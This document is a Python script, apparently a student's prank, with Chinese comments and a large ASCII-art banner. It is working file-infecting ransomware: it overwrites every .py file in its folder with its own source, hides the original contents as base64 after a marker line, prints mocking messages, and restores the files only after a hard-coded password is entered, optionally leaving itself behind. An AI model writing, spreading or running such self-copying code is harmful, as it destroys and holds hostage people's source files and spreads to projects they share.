
import os
import base64
import time

print('芳芳敢敢敢芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳敢敢敢敢敢敢敢敢敢敢敢嚴嚴敢敢敢嚴嚴龘龘龘嚴嚴嚴嚴嚴嚴嚴芳北')
print('敢敢敢芳芳敢敢芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳敢敢敢敢敢敢敢敢敢敢敢敢芳永永北小人小北芳敢嚴嚴嚴嚴嚴龘龘嚴敢')
print('芳永小人小北敢敢敢芳芳芳芳芳芳芳芳芳芳芳芳芳芳敢敢敢敢敢敢敢敢敢敢敢芳北永永小丿人人人北永芳敢龘龘龘龘龘龘龘')
print('人丿丿、、丿小芳敢敢芳芳芳芳芳芳芳芳芳芳芳芳芳敢敢敢敢敢敢敢敢敢敢嚴敢芳芳北人人人小人小小小北永芳敢敢嚴龘龘')
print('丿丿丿丿丿、、丿北嚴敢敢芳芳芳芳芳芳芳芳芳芳敢敢敢敢敢芳永北永永永敢嚴嚴嚴敢永永北人丿丿丿丿丿丿丿丿人人小永')
print('丿丿丿丿丿丿丿丿丿小芳敢敢敢芳芳芳芳芳芳芳敢敢敢敢敢芳永北北北北北永芳敢嚴嚴嚴嚴敢人丿丿丿丿丿丿丿丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿人北敢敢敢敢敢敢敢芳芳敢嚴敢敢芳永北北北北北北北永永敢嚴嚴嚴敢小丿丿丿丿丿丿丿丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿丿丿小芳敢敢永北小人永嚴敢芳永芳芳永永北永永永永永永永敢嚴嚴嚴永小人丿丿丿丿丿丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿丿丿丿人人人丿丿人永芳芳永永永永芳芳永永永永永永永永永芳敢嚴嚴敢小人丿丿丿丿丿丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿丿丿丿丿丿丿丿人永永永永永永永永芳敢永永永永永永永永永永芳敢嚴嚴永人丿丿丿丿丿丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿丿丿丿丿丿丿小永永永永北北永永永芳敢芳永永永永永永永永永芳敢嚴嚴芳小丿丿丿丿丿丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿丿丿丿丿丿小永永永北北北北北永永芳芳芳永永永永永永永永永永芳敢嚴嚴北丿丿丿丿丿丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿丿丿丿丿北芳芳永永北北北北北北永永永永永永永永北永永永永永芳敢嚴嚴永丿丿丿丿丿丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿丿丿丿北芳芳永永北北北永永永永北北永永芳芳芳永永永永永永芳芳敢嚴嚴永丿丿丿丿丿丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿丿丿小芳芳永永北北永永永永芳芳北北永芳芳敢敢芳芳永永永芳芳芳芳嚴嚴芳人丿丿丿丿丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿丿小芳芳永永永永永永永永芳敢芳永永芳芳芳芳敢敢敢芳芳芳芳芳芳芳敢嚴嚴永人丿丿人丿丿丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿丿北芳永永永永永芳芳芳芳永芳芳敢敢芳芳永永永芳芳芳芳芳芳芳芳芳敢嚴嚴敢小丿人人人人人丿丿')
print('丿丿丿丿丿丿丿丿丿丿小芳芳永永永永芳芳芳芳芳芳永永敢敢芳永永永永永永芳芳芳芳芳芳芳敢嚴嚴嚴永人人人人人丿丿丿')
print('丿丿丿丿丿丿丿丿丿丿永芳永永永永芳嚴嚴芳小永芳芳芳敢敢芳永永永永永永芳芳芳芳芳芳敢敢嚴嚴嚴永人人人人人丿丿丿')
print('丿丿丿丿丿丿丿丿丿北敢芳永永永芳芳芳嚴嚴芳小永敢芳芳芳永北北永永永芳芳芳芳芳芳敢敢嚴嚴嚴嚴芳人人人人人丿丿丿')
print('丿丿丿丿丿丿丿丿北敢敢芳永永芳芳永北芳嚴嚴芳北芳芳芳永永北北永永永芳芳芳芳芳敢敢嚴嚴嚴嚴嚴芳小人人人人人丿丿')
print('丿丿丿丿丿丿丿北敢敢敢芳永永芳芳芳北北芳嚴敢永芳芳芳永北北北永永永芳芳芳芳芳敢敢嚴嚴嚴嚴嚴敢小人人人人人人丿')
print('人丿丿丿丿丿小芳敢敢敢芳永永永芳敢芳北北芳嚴敢芳芳芳永永永永永永永芳芳芳芳敢敢嚴嚴嚴嚴嚴嚴芳小人人人人人丿丿')
print('人丿丿丿丿人芳敢敢敢敢敢芳永永永敢敢芳芳芳芳芳芳永永永永永永永永永永芳芳芳敢嚴嚴嚴嚴嚴嚴敢北人人人人人丿丿丿')
print('人人人丿人芳敢敢敢敢敢敢芳永永永永芳芳芳芳芳永永永永永永永永永永永永芳芳敢嚴嚴嚴嚴嚴嚴嚴永小人人人人人人丿丿')
print('小人人小永敢敢敢敢敢敢敢敢芳永永永永芳芳芳永永永永永永永永芳芳永永永芳敢嚴嚴嚴嚴嚴嚴嚴芳北小人人人人人人丿丿')
print('永北北芳敢芳芳芳敢嚴嚴敢敢敢芳芳芳永芳芳芳永永永永永芳芳芳芳芳芳芳芳芳敢嚴嚴嚴嚴嚴嚴芳北小人人人人人人人丿丿')
print('永永芳芳芳芳芳芳敢嚴嚴嚴敢敢敢芳芳芳芳芳芳永永永芳芳芳芳芳芳芳芳芳芳敢敢嚴嚴嚴嚴嚴芳北小人人人人人人人丿丿丿')
print('芳芳芳芳芳芳芳芳敢嚴嚴嚴嚴敢敢敢敢芳芳芳永永芳芳芳芳芳芳芳芳芳芳芳敢敢敢嚴嚴嚴嚴永小小人人人人人人人丿丿丿丿')
print('芳芳芳芳芳芳芳芳敢敢嚴嚴嚴嚴嚴敢敢敢芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳敢嚴敢永小小人人人人人人人人丿丿丿丿')
print('芳芳永芳芳芳芳芳芳敢敢嚴嚴嚴嚴嚴敢敢敢敢芳芳芳芳芳芳芳芳芳芳芳芳芳芳芳敢芳芳北小小人人人人人人人人丿丿丿丿丿')
print('芳芳永永永永芳芳芳芳敢敢嚴嚴嚴嚴嚴敢敢敢敢芳芳芳芳芳芳芳芳芳芳芳芳敢敢芳永北小人人人人人人人人人人丿丿丿丿丿')
print('永永永永永永永芳芳芳芳芳敢敢敢嚴嚴嚴敢敢敢敢敢敢敢芳芳芳敢敢芳芳芳芳芳永北小人人人人人人人人人人人丿丿丿丿丿')
print('永永永永永永永永永芳芳芳芳芳敢敢敢敢敢敢敢敢敢敢敢敢芳敢敢敢芳芳芳永北小小人人人人人人人人人人人人丿丿丿丿丿')
print('永永永永永永永永永永永芳芳芳芳芳芳芳敢敢敢敢敢敢敢敢敢敢嚴嚴芳永北北小人人人人人人人人人人丿丿丿丿丿丿丿丿丿')
print('永永永永永永永永永永永永芳芳芳芳芳芳芳芳敢敢芳敢敢敢芳芳永永北小小人人人人人人人人人人人丿丿丿丿丿丿丿丿丿丿')
print('永永永永永永永永永永永永永芳芳芳芳芳芳芳芳芳敢芳芳永北北小小小人人人人人人人人人人人人丿丿丿丿丿丿丿丿丿丿丿')
print('永永永永永永永永永永永永永永芳芳芳芳芳芳敢敢芳永北北小小人人人人人人人人人人人人人人人丿丿丿丿丿丿丿丿丿丿丿')
print('芳永永永永永永永永永永永永永芳芳芳芳芳芳敢芳永北小小小人人人人人人人人人人人人人丿人丿丿丿丿丿丿丿丿丿丿丿丿')
print('芳永永永永永永永永永永永永永永芳芳芳芳芳芳永北小小小小人人人人人人人人人人人人丿丿丿丿丿丿丿丿丿丿丿丿丿丿丿')
current_file_path = __file__
current_dir = os.path.dirname(current_file_path)
#密碼
password ='password'
again ='again'
NOT_CORRECT='not correct'
a=0
b=0
c=0
d=0
with open(current_file_path, 'r', encoding='utf-8') as f:
    virus = f.read()

def countdown(a):
    while a > 0:
        print(a)
        time.sleep(1)  
        a =a-1

def open_file():
    for filename in os.listdir(current_dir):
                if filename.endswith('.py'):
                    file_path = os.path.join(current_dir, filename)              
                    with open(file_path, 'r', encoding='utf-8') as f:
                        lines = f.readlines()

                    if '###1145141919810###\n' in lines:
                        marker = lines.index('###1145141919810###\n')  
                        encrypted_content = ''.join(lines[marker + 1:])  
                        decrypted_content = base64.b64decode(encrypted_content.encode('utf-8')).decode()

                        with open(file_path, 'w', encoding='utf-8') as f:
                            left_virus = input(f"檔案 '{filename}'是否要在該檔案中留下本程式？(y/n): ")
                            f.write(decrypted_content)  #把解密檔打過去
                            if left_virus.lower()!='n':
                                f.write(virus)  #把病毒複製過去
                                print('已保留')
                        print(f"檔案 '{filename}' 已成功解密。")

# 在同一個資料夾內搜尋所有 Python 檔案
for filename in os.listdir(current_dir):
    if filename.endswith('.py'):
        a =a+1
        
        if 'b13' in filename.lower():
            B13FILE = input(f"檔案 '{filename}' 可能是同學的作業，是否要繼續進行？(y/n): ")
            if B13FILE.lower() != 'y':
                print(f"'{filename}'成功逃過一劫")
                continue

        file_path = os.path.join(current_dir, filename)
        
        # 檢查檔案是否包含指定的字串
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
            if '###1145141919810###' not in content:
                # 若不包含該字串，則將當前檔案的內容複製並接續原檔案內容
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(virus)  # 複製自身程式碼
                        # 用 base64 加密目標檔案的內容
                encrypted_content = base64.b64encode(content.encode('utf-8')).decode()
                with open(file_path, 'a', encoding='utf-8') as f:
                    f.write("\n###1145141919810###\n")  # 加入標記行
                    f.write(encrypted_content)  # 加入加密內容
                print(f"  {filename} :噗嘰啪（被病毒感染的聲音")
                d=d+1
            else:
                print(f"{filename} 已經被感染過了")
                b=b+1

if a == b and a!=0:
    print('檔案全都已經被感染了，太可憐了')
if d == 0:
    print('這次沒有感染到檔案')
a=0

while True:
        ENTER_PASSWORD= input("ENTER PASSWORD:")

        if ENTER_PASSWORD.lower() == password:
            print("密碼正確")
        
            open_file()
            break
    
        ENTER_PASSWORD=input("TRY AGAIN:")
        
        if ENTER_PASSWORD.lower() == again:
            print("密碼正確")

            open_file()
            break
        ENTER_PASSWORD=input("PASSWORD IS NOT CORRECT:")
        
        if ENTER_PASSWORD.lower() == NOT_CORRECT:
            print("密碼正確")

            open_file()
            break
        else:   
            c=c+1
            if c>=5:
                a=a+1
                b=a*10
                c=0
                print('你也試太多次了，請等待',b,'秒後再試')
                countdown(b)
            else:
                print('這次真的答錯了，再試一次')